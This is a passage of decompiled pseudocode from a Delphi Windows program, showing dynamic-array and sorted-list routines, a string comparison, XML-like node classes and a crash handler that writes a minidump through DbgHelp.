      v5[1] = v10[1];
      v10[1] = result;
    }
  }
  return result;
}

//----- (00429060) --------------------------------------------------------
_BYTE *__fastcall sub_429060(_BYTE *result, char a2)
{
  _BYTE *v3; // esi

  v3 = result;
  if ( a2 != result[16] )
  {
    if ( a2 )
      result = (_BYTE *)(*(int (__fastcall **)(_BYTE *))(*(_DWORD *)result + 8))(result);
    v3[16] = a2;
  }
  return result;
}

//----- (00429080) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_429080@<eax>(int a1@<edi>, int a2@<esi>)
{
  __int64 v2; // rax
  char v3; // bl
  int *v4; // esi
  int v5; // ecx
  _DWORD *result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-1Ch] BYREF
  void *v8; // [esp-14h] [ebp-18h]
  void **v9; // [esp-10h] [ebp-14h]
  unsigned int v10; // [esp-4h] [ebp-8h]
  int v11; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v11 = 0;
  v2 = System::__linkproc__ BeforeDestruction(a1, a2);
  v3 = BYTE4(v2);
  v4 = (int *)v2;
  v9 = &savedregs;
  v8 = &loc_42910B;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_405588();
  (*(void (__fastcall **)(int *, int, int, void **, void *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v4 + 4))(
    v4,
    *v4,
    v5,
    v9,
    v8,
    ExceptionList);
  if ( v4[2] > 0 )
  {
    sub_40B51C((int **)off_468068, &v11);
    sub_428D20(v11, 0, (int)v4);
  }
  if ( v4[3] )
  {
    System::__linkproc__ DynArraySetLength(0);
    v4[3] = 0;
  }
  __writefsdword(0, v10);
  savedregs = &loc_429112;
  result = sub_406C44(&v11);
  if ( v3 > 0 )
    return (_DWORD *)System::__linkproc__ ClassDestroy(v4);
  return result;
}
// 429105: bad sp value at call
// 4290AE: variable 'v5' is possibly undefined
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 40591C: using guessed type __int64 __cdecl System::__linkproc__ BeforeDestruction(_DWORD, _DWORD);
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (00429140) --------------------------------------------------------
int __usercall sub_429140@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>)
{
  char v5; // al
  bool v6; // cf
  char v7; // al
  int v8; // eax
  int v9; // edx
  int v10; // edi
  int v11; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-2Ch] BYREF
  void *v14; // [esp-8h] [ebp-28h]
  int *v15; // [esp-4h] [ebp-24h]
  int v16; // [esp+Ch] [ebp-14h] BYREF
  int v17; // [esp+10h] [ebp-10h] BYREF
  int v18; // [esp+14h] [ebp-Ch] BYREF
  int v19; // [esp+18h] [ebp-8h]
  int v20; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v16 = 0;
  v17 = 0;
  v19 = a3;
  v20 = a2;
  v15 = &savedregs;
  v14 = &loc_429279;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( *(_BYTE *)(a1 + 16) )
  {
    if ( (unsigned __int8)sub_428DC0(a1, v20, &v18, v15, v14, ExceptionList) )
    {
      v5 = *(_BYTE *)(a1 + 17);
      v6 = v5 == 0;
      v7 = v5 - 1;
      if ( v6 )
        goto LABEL_20;
      if ( v7 == 1 )
      {
        sub_40B51C((int **)off_467F70, &v17);
        sub_428D20(v17, 0, a4);
      }
    }
  }
  else
  {
    v18 = *(_DWORD *)(a1 + 8);
  }
  v8 = *(_DWORD *)(a1 + 12);
  if ( v8 == *(_DWORD *)(a1 + 8) )
  {
    if ( v8 <= 64 )
    {
      if ( v8 <= 8 )
        v9 = 4;
      else
        v9 = 16;
    }
    else
    {
      v9 = *(int *)(a1 + 12) >> 2;
    }
    v10 = v9 + v8;
    if ( v9 + v8 < *(_DWORD *)(a1 + 8) )
    {
      sub_40B51C((int **)off_468068, &v16);
      sub_428D20(v16, v10, v10);
    }
    if ( v10 != *(_DWORD *)(a1 + 12) )
    {
      System::__linkproc__ DynArraySetLength(v10);
      *(_DWORD *)(a1 + 12) = v10;
    }
  }
  v11 = *(_DWORD *)(a1 + 4) + 8 * v18;
  if ( *(_DWORD *)(a1 + 8) - v18 > 0 )
    System::Move((const void *)(*(_DWORD *)(a1 + 4) + 8 * v18), (void *)(v11 + 8), 8 * (*(_DWORD *)(a1 + 8) - v18));
  *(_DWORD *)v11 = 0;
  *(_DWORD *)(v11 + 4) = v19;
  sub_406FE8((volatile __int32 *)v11, v20);
  ++*(_DWORD *)(a1 + 8);
LABEL_20:
  __writefsdword(0, (unsigned int)ExceptionList);
  v15 = (int *)&loc_429280;
  sub_406CA4((int)&v16, 2);
  return v18;
}
// 4291C2: conditional instruction was optimized away because eax.4>=41
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 428DC0: using guessed type int __fastcall sub_428DC0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00429290) --------------------------------------------------------
_DWORD *__usercall sub_429290@<eax>(int a1@<eax>, int a2@<edi>)
{
  unsigned int v4[2]; // [esp-10h] [ebp-14h] BYREF
  int *v5; // [esp-8h] [ebp-Ch]
  int v6; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_429309;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  if ( *(_DWORD *)(a1 + 8) )
  {
    *(_DWORD *)(a1 + 8) = 0;
    if ( *(int *)(a1 + 8) > 0 )
    {
      sub_40B51C((int **)off_468068, &v6);
      sub_428D20(v6, 0, a2);
    }
    if ( *(_DWORD *)(a1 + 12) )
    {
      System::__linkproc__ DynArraySetLength(0);
      *(_DWORD *)(a1 + 12) = 0;
    }
  }
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_429310;
  return sub_406C44(&v6);
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (00429320) --------------------------------------------------------
int __fastcall sub_429320(int result)
{
  _DWORD *v1; // esi
  int v2; // ebx

  v1 = (_DWORD *)result;
  v2 = *(_DWORD *)(result + 8);
  if ( v2 )
  {
    do
    {
      --v2;
      sub_405598(*(_DWORD **)(v1[1] + 8 * v2 + 4));
    }
    while ( v2 );
    return (*(int (__fastcall **)(_DWORD *))(*v1 + 4))(v1);
  }
  return result;
}

//----- (00429350) --------------------------------------------------------
int __fastcall sub_429350(Idthreadcomponent::TIdThreadComponent *this, unsigned int System::AnsiString)
{
  int v4; // esi
  int result; // eax
  int v6; // ebx

  if ( *((_DWORD *)this + 2) <= System::AnsiString )
    Idthreadcomponent::TIdThreadComponent::SetThreadName(this, System::AnsiString);
  v4 = *((_DWORD *)this + 1) + 8 * System::AnsiString;
  sub_407DEC(v4, (int)&unk_423578);
  result = --*((_DWORD *)this + 2) - System::AnsiString;
  v6 = result;
  if ( result > 0 )
  {
    System::Move((const void *)(v4 + 8), (void *)v4, 8 * result);
    result = v4 + 8 * v6;
    *(_DWORD *)result = 0;
  }
  return result;
}

//----- (004293C0) --------------------------------------------------------
int __fastcall sub_4293C0(_BYTE *a1, int a2, signed int *a3)
{
  int (__fastcall **v3)(_DWORD, _DWORD, _DWORD); // eax
  signed int v4; // esi
  unsigned int v5; // ebx
  int v6; // eax
  int (__fastcall **v8)(_DWORD, _DWORD, _DWORD); // eax
  _DWORD *v9; // ebx
  _DWORD *v10; // esi
  int (__fastcall *v11)(_BYTE *, _DWORD, int); // [esp+8h] [ebp-38h]
  signed int v12; // [esp+10h] [ebp-30h]
  unsigned __int8 v13; // [esp+17h] [ebp-29h]
  int (__fastcall *v14)(_BYTE *, _DWORD, int); // [esp+18h] [ebp-28h]
  int (__fastcall **v15)(_DWORD, _DWORD, _DWORD); // [esp+24h] [ebp-1Ch]
  bool v16; // [esp+2Bh] [ebp-15h]
  signed int v17; // [esp+2Ch] [ebp-14h]
  unsigned __int8 v18; // [esp+33h] [ebp-Dh]

  if ( a1[16] )
  {
    v18 = 0;
    v3 = (int (__fastcall **)(_DWORD, _DWORD, _DWORD))*((_DWORD *)a1 + 2);
    if ( v3 )
    {
      v4 = 0;
      v17 = (signed int)v3 - 1;
      v16 = a1[17] != 1;
      v15 = (int (__fastcall **)(_DWORD, _DWORD, _DWORD))*((_DWORD *)a1 + 1);
      v14 = **(int (__fastcall ***)(_BYTE *, _DWORD, int))a1;
      do
      {
        v5 = (unsigned int)(v17 + v4) >> 1;
        v6 = v14(a1, v15[2 * v5], a2);
        if ( v6 >= 0 )
        {
          v17 = v5 - 1;
          if ( !v6 )
          {
            v18 = 1;
            if ( v16 )
              v4 = v5;
          }
        }
        else
        {
          v4 = v5 + 1;
        }
      }
      while ( v4 <= v17 );
      *a3 = v4;
    }
    else
    {
      *a3 = 0;
    }
    return v18;
  }
  else
  {
    v13 = 0;
    v8 = (int (__fastcall **)(_DWORD, _DWORD, _DWORD))*((_DWORD *)a1 + 2);
    if ( v8 )
    {
      v11 = **(int (__fastcall ***)(_BYTE *, _DWORD, int))a1;
      v9 = (_DWORD *)*((_DWORD *)a1 + 1);
      v10 = &v9[2 * (_DWORD)v8];
      v12 = 0;
      while ( v11(a1, *v9, a2) )
      {
        ++v12;
        v9 += 2;
        if ( v10 == v9 )
          goto LABEL_19;
      }
      v13 = 1;
LABEL_19:
      if ( v13 )
        *a3 = v12;
      else
        *a3 = -1;
    }
    else
    {
      *a3 = -1;
    }
    return v13;
  }
}

//----- (004294E0) --------------------------------------------------------
int __usercall sub_4294E0@<eax>(
        int a1@<eax>,
        unsigned int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>)
{
  return sub_4294F0(a1, a2, a3, a4, a5, a6, 0);
}

//----- (004294F0) --------------------------------------------------------
int __userpurge sub_4294F0@<eax>(
        int a1@<eax>,
        unsigned int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>,
        int a7)
{
  int v9; // eax
  int v10; // edx
  int v11; // esi
  unsigned int v13[2]; // [esp-18h] [ebp-2Ch] BYREF
  int *v14; // [esp-10h] [ebp-24h]
  int v15; // [esp-Ch] [ebp-20h]
  int v16; // [esp-8h] [ebp-1Ch]
  int v17; // [esp-4h] [ebp-18h]
  int v18; // [esp+0h] [ebp-14h] BYREF
  int v19; // [esp+4h] [ebp-10h] BYREF
  int v20; // [esp+8h] [ebp-Ch] BYREF
  int v21; // [esp+Ch] [ebp-8h]
  int v22; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v21 = 0;
  v20 = 0;
  v19 = 0;
  v18 = 0;
  v17 = a4;
  v16 = a6;
  v15 = a5;
  v22 = a3;
  v14 = &savedregs;
  v13[1] = (unsigned int)&loc_429626;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  if ( *(_BYTE *)(a1 + 16) )
  {
    sub_40B51C((int **)off_467FF8, &v20);
    sub_428D20(v20, 0, a2);
  }
  if ( *(_DWORD *)(a1 + 8) < a2 )
  {
    sub_40B51C((int **)off_468128, &v19);
    sub_428D20(v19, a2, a2);
  }
  v9 = *(_DWORD *)(a1 + 12);
  if ( v9 == *(_DWORD *)(a1 + 8) )
  {
    if ( v9 <= 64 )
    {
      if ( v9 <= 8 )
        v10 = 4;
      else
        v10 = 16;
    }
    else
    {
      v10 = *(int *)(a1 + 12) >> 2;
    }
    v21 = v9 + v10;
    if ( *(_DWORD *)(a1 + 8) > v9 + v10 )
    {
      sub_40B51C((int **)off_468068, &v18);
      sub_428D20(v18, v21, a2);
    }
    if ( *(_DWORD *)(a1 + 12) != v21 )
    {
      System::__linkproc__ DynArraySetLength(v21);
      *(_DWORD *)(a1 + 12) = v21;
    }
  }
  v11 = *(_DWORD *)(a1 + 4) + 8 * a2;
  if ( (int)(*(_DWORD *)(a1 + 8) - a2) > 0 )
    System::Move((const void *)(*(_DWORD *)(a1 + 4) + 8 * a2), (void *)(v11 + 8), 8 * (*(_DWORD *)(a1 + 8) - a2));
  *(_DWORD *)v11 = 0;
  *(_DWORD *)(v11 + 4) = a7;
  sub_406FE8((volatile __int32 *)v11, v22);
  ++*(_DWORD *)(a1 + 8);
  __writefsdword(0, v13[0]);
  v14 = (int *)&loc_42962D;
  return sub_406CA4((int)&v18, 3);
}
// 4294F0: could not find valid save-restore pair for ebx
// 4294F0: could not find valid save-restore pair for edi
// 4294F0: could not find valid save-restore pair for esi
// 429565: conditional instruction was optimized away because eax.4>=41
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (00429640) --------------------------------------------------------
int (__fastcall *__fastcall sub_429640(_BYTE *a1, int a2))(_DWORD, _DWORD, _DWORD)
{
  int (__fastcall **v2)(_DWORD, _DWORD, _DWORD); // eax
  signed int v4; // esi
  unsigned int v5; // ebx
  int v6; // eax
  int (__fastcall **v7)(_DWORD, _DWORD, _DWORD); // eax
  _DWORD *v8; // ebx
  _DWORD *v9; // esi
  int (__fastcall *v10)(_BYTE *, _DWORD, int); // [esp+8h] [ebp-20h]
  int (__fastcall *v11)(_BYTE *, _DWORD, int); // [esp+10h] [ebp-18h]
  int (__fastcall **v12)(_DWORD, _DWORD, _DWORD); // [esp+18h] [ebp-10h]
  signed int v13; // [esp+1Ch] [ebp-Ch]

  if ( a1[16] )
  {
    v2 = (int (__fastcall **)(_DWORD, _DWORD, _DWORD))*((_DWORD *)a1 + 2);
    if ( v2 )
    {
      v4 = 0;
      v13 = (signed int)v2 - 1;
      v12 = (int (__fastcall **)(_DWORD, _DWORD, _DWORD))*((_DWORD *)a1 + 1);
      v11 = **(int (__fastcall ***)(_BYTE *, _DWORD, int))a1;
      do
      {
        v5 = (unsigned int)(v13 + v4) >> 1;
        v6 = v11(a1, v12[2 * v5], a2);
        if ( v6 >= 0 )
        {
          v13 = v5 - 1;
          if ( !v6 )
            return v12[2 * v5 + 1];
        }
        else
        {
          v4 = v5 + 1;
        }
      }
      while ( v4 <= v13 );
      return 0;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    v7 = (int (__fastcall **)(_DWORD, _DWORD, _DWORD))*((_DWORD *)a1 + 2);
    if ( v7 )
    {
      v10 = **(int (__fastcall ***)(_BYTE *, _DWORD, int))a1;
      v8 = (_DWORD *)*((_DWORD *)a1 + 1);
      v9 = &v8[2 * (_DWORD)v7];
      do
      {
        if ( !v10(a1, *v8, a2) )
          return (int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8[1];
        v8 += 2;
      }
      while ( v9 != v8 );
      return 0;
    }
    else
    {
      return 0;
    }
  }
}

//----- (00429710) --------------------------------------------------------
int __fastcall sub_429710(int a1)
{
  int result; // eax
  _DWORD *v3; // esi
  int v4; // eax
  _DWORD *i; // esi
  int v6; // eax
  int v7; // eax
  _DWORD *v8; // [esp+Ch] [ebp-1Ch]
  _DWORD *j; // [esp+Ch] [ebp-1Ch]
  _DWORD *v10; // [esp+10h] [ebp-18h]
  unsigned int v11; // [esp+14h] [ebp-14h]
  int v12; // [esp+18h] [ebp-10h]
  int v13; // [esp+1Ch] [ebp-Ch]
  int v14; // [esp+20h] [ebp-8h]
  int v15; // [esp+24h] [ebp-4h]

  v15 = 0;
  v14 = *(_DWORD *)(a1 + 8) - 1;
  result = 0;
  if ( v14 > 0 )
  {
    while ( v14 - v15 != 1 )
    {
      v13 = v15;
      v12 = v14;
      v11 = (unsigned int)(v14 + v15) >> 1;
      do
      {
        v10 = (_DWORD *)(*(_DWORD *)(a1 + 4) + 8 * v11);
        for ( i = (_DWORD *)(*(_DWORD *)(a1 + 4) + 8 * v13);
              (**(int (__fastcall ***)(int, _DWORD, _DWORD))a1)(a1, *i, *v10) < 0;
              i += 2 )
        {
          ++v13;
        }
        for ( j = (_DWORD *)(*(_DWORD *)(a1 + 4) + 8 * v12);
              (**(int (__fastcall ***)(int, _DWORD, _DWORD))a1)(a1, *j, *v10) > 0;
              j -= 2 )
        {
          --v12;
        }
        if ( v13 <= v12 )
        {
          if ( i != j )
          {
            v6 = *i;
            *i = *j;
            *j = v6;
            v7 = i[1];
            i[1] = j[1];
            j[1] = v7;
          }
          if ( v11 == v13 )
          {
            v11 = v12;
          }
          else if ( v11 == v12 )
          {
            v11 = v13;
          }
          ++v13;
          --v12;
        }
      }
      while ( v13 <= v12 );
      if ( v12 - v15 <= v14 - v13 )
      {
        if ( v15 < v12 )
          sub_428EC0(a1, v15, v12);
        v15 = v13;
      }
      else
      {
        if ( v13 < v14 )
          sub_428EC0(a1, v13, v14);
        v14 = v12;
      }
      result = v15;
      if ( v15 >= v14 )
        return result;
    }
    v3 = (_DWORD *)(*(_DWORD *)(a1 + 4) + 8 * v15);
    v8 = (_DWORD *)(*(_DWORD *)(a1 + 4) + 8 * v14);
    result = (**(int (__fastcall ***)(int, _DWORD, _DWORD))a1)(a1, *v3, *v8);
    if ( result > 0 )
    {
      v4 = *v3;
      *v3 = *v8;
      *v8 = v4;
      result = v3[1];
      v3[1] = v8[1];
      v8[1] = result;
    }
  }
  return result;
}

//----- (00429B60) --------------------------------------------------------
int __fastcall sub_429B60(unsigned __int16 *a1, unsigned __int16 *a2)
{
  unsigned __int16 *v2; // ecx
  unsigned __int16 *v3; // esi
  int result; // eax
  int v5; // eax
  int v6; // eax
  int v7; // edi
  int v8; // edx
  int v9; // ebx
  int v10; // ebx
  int v11; // [esp+0h] [ebp-10h]

  v2 = a1;
  v3 = a2;
  if ( a2 == a1 )
    return 0;
  if ( a1 )
  {
    if ( a2 )
    {
      v11 = *((_DWORD *)a1 - 1);
      v6 = *((_DWORD *)a2 - 1);
      v7 = v6;
      v8 = v11;
      if ( v6 < v11 )
        v8 = v6;
      if ( v8 <= 0 )
      {
        return v11 - v7;
      }
      else
      {
        while ( 1 )
        {
          v9 = *v3;
          result = *v2 - v9;
          if ( *v2 != v9 )
            break;
          if ( v8 == 1 )
            return v11 - v7;
          v10 = v3[1];
          result = v2[1] - v10;
          if ( v2[1] != v10 )
            break;
          v3 += 2;
          v2 += 2;
          v8 -= 2;
          if ( v8 <= 0 )
            return v11 - v7;
        }
      }
    }
    else
    {
      return *((_DWORD *)a1 - 1);
    }
  }
  else
  {
    v5 = (int)a2;
    if ( a2 )
      v5 = *((_DWORD *)a2 - 1);
    return -v5;
  }
  return result;
}
// 429B8D: conditional instruction was optimized away because eax.4!=0
// 429B98: conditional instruction was optimized away because eax.4!=0
// 429BA6: conditional instruction was optimized away because edx.4!=0

//----- (00429C00) --------------------------------------------------------
int __fastcall sub_429C00(unsigned __int16 *a1, int a2, int a3)
{
  signed int v3; // esi
  signed int v4; // edi
  unsigned int v5; // ebx
  int v6; // eax
  int v8; // [esp+Ch] [ebp-Ch]

  v8 = 0;
  if ( a3 )
  {
    v3 = 0;
    v4 = a3 - 1;
    do
    {
      v5 = (unsigned int)(v4 + v3) >> 1;
      v6 = sub_429B60(*(unsigned __int16 **)(a2 + 8 * v5), a1);
      if ( v6 >= 0 )
      {
        v4 = v5 - 1;
        if ( !v6 )
          return *(_DWORD *)(a2 + 8 * v5 + 4);
      }
      else
      {
        v3 = v5 + 1;
      }
    }
    while ( v4 >= v3 );
  }
  return v8;
}

//----- (00429C60) --------------------------------------------------------
int __fastcall sub_429C60(int a1, int a2)
{
  return sub_429ED0((_DWORD *)(a1 + 24), a2);
}

//----- (00429C70) --------------------------------------------------------
int __fastcall sub_429C70(int a1)
{
  sub_429F50((_DWORD *)(a1 + 12));
  sub_429F50((_DWORD *)(a1 + 24));
  return nullsub_3(a1);
}
// 405844: using guessed type int __fastcall nullsub_3(_DWORD);

//----- (00429CF0) --------------------------------------------------------
int __fastcall sub_429CF0(int a1, int a2)
{
  int (**v4)(); // eax
  int v5; // edx
  int v6; // esi

  v4 = (int (**)())(**(int (__fastcall ***)(int, int))a1)(a1, a2);
  if ( !v4 )
    v4 = cls_NOM_TNOMNode;
  LOBYTE(v5) = 1;
  v6 = Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(v4, v5, a2);
  (*(void (__fastcall **)(int, int))(*(_DWORD *)a1 + 4))(a1, v6);
  return v6;
}
// 429D0E: variable 'v5' is possibly undefined
// 429AF4: using guessed type int (*cls_NOM_TNOMNode[3])();
// 429C90: using guessed type int __fastcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD, _DWORD, _DWORD);

//----- (00429D30) --------------------------------------------------------
int __fastcall sub_429D30(int a1, int a2, int a3, char a4)
{
  int *v5; // edx
  int v6; // eax
  int v7; // eax
  int v8; // esi
  int v9; // ebx
  char v10; // zf
  int v11; // ebx

  v5 = (int *)(a1 + 12);
  v6 = *(_DWORD *)(a1 + 16);
  if ( v6 )
  {
    v8 = *v5;
    v9 = 4 * v6 + *v5;
    do
    {
      v9 -= 4;
      sub_407AA0(*(_DWORD *)(*(_DWORD *)v9 + 8), a2);
      if ( v10 )
      {
        v7 = *(_DWORD *)v9;
        goto LABEL_8;
      }
    }
    while ( v9 != v8 );
    v7 = 0;
  }
  else
  {
    v7 = 0;
  }
LABEL_8:
  v11 = v7;
  if ( !v7 )
  {
    v11 = sub_429E30((int)&cls_NOM_TNOMAttr, 1, a2, a3, a4);
    sub_429ED0((_DWORD *)(a1 + 12), v11);
  }
  return v11;
}
// 429D71: variable 'v10' is possibly undefined
// 4299E4: using guessed type __int16 cls_NOM_TNOMAttr;

//----- (00429DC0) --------------------------------------------------------
int sub_429DC0()
{
  return 0;
}

//----- (00429DD0) --------------------------------------------------------
int __fastcall sub_429DD0(int a1)
{
  int v2; // ebx
  int i; // esi
  int v4; // eax
  unsigned __int8 v6; // [esp+Fh] [ebp-1h]

  v6 = 0;
  if ( *(_DWORD *)(a1 + 28) - 1 < 0 )
  {
    return 1;
  }
  else
  {
    v2 = *(_DWORD *)(a1 + 28);
    for ( i = 0; ; ++i )
    {
      v4 = *(_DWORD *)(*(_DWORD *)(a1 + 24) + 4 * i);
      if ( !(*(unsigned __int8 (__fastcall **)(int))(*(_DWORD *)v4 + 8))(v4) )
        break;
      if ( !--v2 )
        return 1;
    }
  }
  return v6;
}

//----- (00429E10) --------------------------------------------------------
volatile __int32 *__fastcall sub_429E10(int a1, int a2)
{
  return sub_406FE8((volatile __int32 *)(a1 + 4), a2);
}

//----- (00429E30) --------------------------------------------------------
int __fastcall sub_429E30(int a1, char a2, int a3, int a4, char a5)
{
  int v5; // edi
  int v6; // ebx
  char v8; // [esp+Fh] [ebp-1h]

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v5 = a3;
  v8 = a2;
  v6 = a1;
  sub_405568(a1, 0);
  sub_406FE8((volatile __int32 *)(v6 + 8), v5);
  sub_406FE8((volatile __int32 *)(v6 + 12), a4);
  sub_406FE8((volatile __int32 *)(v6 + 4), a4);
  *(_BYTE *)(v6 + 16) = a5;
  if ( v8 )
    System::__linkproc__ AfterConstruction(v6);
  return v6;
}
// 429E43: variable 'a3' is possibly undefined
// 429E45: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);

//----- (00429EA0) --------------------------------------------------------
bool __fastcall sub_429EA0(int a1)
{
  char v1; // zf
  bool result; // al

  result = 0;
  if ( *(_BYTE *)(a1 + 16) )
  {
    sub_407AA0(*(_DWORD *)(a1 + 12), *(_DWORD *)(a1 + 4));
    if ( v1 )
      return 1;
  }
  return result;
}
// 429EB7: variable 'v1' is possibly undefined

//----- (00429ED0) --------------------------------------------------------
int __fastcall sub_429ED0(_DWORD *a1, int a2)
{
  int result; // eax

  if ( a1[1] == a1[2] )
    sub_429F00((int)a1);
  result = a1[1];
  *(_DWORD *)(*a1 + 4 * result) = a2;
  ++a1[1];
  return result;
}

//----- (00429F00) --------------------------------------------------------
int __fastcall sub_429F00(int a1)
{
  int v2; // eax
  int v3; // eax

  v2 = *(_DWORD *)(a1 + 8);
  if ( v2 <= 64 )
  {
    if ( v2 <= 8 )
      v3 = 4;
    else
      v3 = 16;
  }
  else
  {
    v3 = v2 >> 2;
  }
  *(_DWORD *)(a1 + 8) += v3;
  return System::__linkproc__ DynArraySetLength(*(_DWORD *)(a1 + 8));
}
// 429F10: conditional instruction was optimized away because eax.4>=41
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (00429F50) --------------------------------------------------------
int __fastcall sub_429F50(_DWORD *a1)
{
  int result; // eax
  _DWORD **v3; // esi
  _DWORD **v4; // ebx

  result = a1[1];
  if ( result )
  {
    v3 = (_DWORD **)*a1;
    v4 = (_DWORD **)(4 * result + *a1);
    do
      sub_405598(*--v4);
    while ( v4 != v3 );
    result = 0;
    a1[1] = 0;
  }
  return result;
}

//----- (00429F90) --------------------------------------------------------
int __fastcall sub_429F90(_DWORD *a1)
{
  int result; // eax

  sub_408B34(a1, (int)&byte_42995C);
  a1[1] = 0;
  result = 0;
  a1[2] = 0;
  return result;
}
// 42995C: using guessed type char byte_42995C;

//----- (00429FB0) --------------------------------------------------------
int sub_429FB0()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_429FF1;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_46EAB4 )
  {
    sub_406C44(&dword_46EAB0);
    sub_407DEC((int)&unk_46EAB8, (int)&byte_413DFC);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 413DFC: using guessed type char byte_413DFC;
// 46EAB0: using guessed type _DWORD dword_46EAB0;
// 46EAB4: using guessed type int dword_46EAB4;

//----- (0042A000) --------------------------------------------------------
LONG __stdcall TopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  HANDLE CurrentProcess; // eax
  DWORD CurrentProcessId; // [esp-24h] [ebp-3Ch]
  HANDLE v4; // [esp-20h] [ebp-38h]
  int v5; // [esp-18h] [ebp-30h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v7; // [esp-8h] [ebp-20h]
  int *v8; // [esp-4h] [ebp-1Ch]
  int v9[3]; // [esp+0h] [ebp-18h] BYREF
  int *v10; // [esp+Ch] [ebp-Ch]
  HANDLE hObject; // [esp+10h] [ebp-8h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  if ( FileName )
  {
    hObject = CreateFileW_0(&FileName, 0x40000000u, 2u, 0, 2u, 0x80u, 0);
    if ( hObject )
    {
      if ( hObject != (HANDLE)-1 )
      {
        v8 = &savedregs;
        v7 = &loc_42A0A8;
        ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)&ExceptionList);
        v10 = 0;
        if ( ExceptionInfo )
        {
          v9[0] = GetCurrentThreadId_0();
          v9[1] = (int)ExceptionInfo;
          v9[2] = 0;
          v10 = v9;
        }
        v5 = (int)v10;
        v4 = hObject;
        CurrentProcessId = GetCurrentProcessId();
        CurrentProcess = GetCurrentProcess();
        dword_466A28(CurrentProcess, CurrentProcessId, v4, 0, v5, 0, 0, ExceptionList);
        __writefsdword(0, (unsigned int)v7);
        v9[0] = (int)&loc_42A0AF;
        CloseHandle_0(hObject);
      }
    }
  }
  return 1;
}
// 466A28: using guessed type int (__stdcall *dword_466A28)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0042A0C0) --------------------------------------------------------
__int16 __fastcall sub_42A0C0(int a1)
{
  __int16 result; // ax
  int v2; // [esp+0h] [ebp-10h]
  int v3; // [esp+4h] [ebp-Ch]
  int v4; // [esp+8h] [ebp-8h]

  Guitesting::TGUITestCase::Hide(&FileName, 522);
  v3 = System::__linkproc__ LStrLen(a1);
  if ( v3 >= 521 )
    v3 = 521;
  result = v3;
  if ( v3 > 0 )
  {
    v2 = v3;
    v4 = 1;
    do
    {
      result = *(_WORD *)(a1 + 2 * v4 - 2);
      word_46EB86[v4++] = result;
      --v2;
    }
    while ( v2 );
  }
  return result;
}
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 46EB86: using guessed type __int16 word_46EB86[];

//----- (0042A140) --------------------------------------------------------
void sub_42A140()
{
  if ( !byte_466A24 )
  {
    dword_466A20 = sub_426EB0((int)L"DbgHelp.dll", 1);
    if ( dword_466A20 )
    {
      dword_466A28 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_427020(dword_466A20, (int)"MiniDumpWriteDump");
      if ( dword_466A28 )
      {
        SetUnhandledExceptionFilter(TopLevelExceptionFilter);
        byte_466A24 = 1;
        *off_4681D4 = 1;
        *off_46807C[0] = (int)sub_42A130;
      }
    }
  }
}
// 42A130: using guessed type int sub_42A130();
// 42A1C0: using guessed type wchar_t aDbghelpDll[12];
// 466A24: using guessed type char byte_466A24;
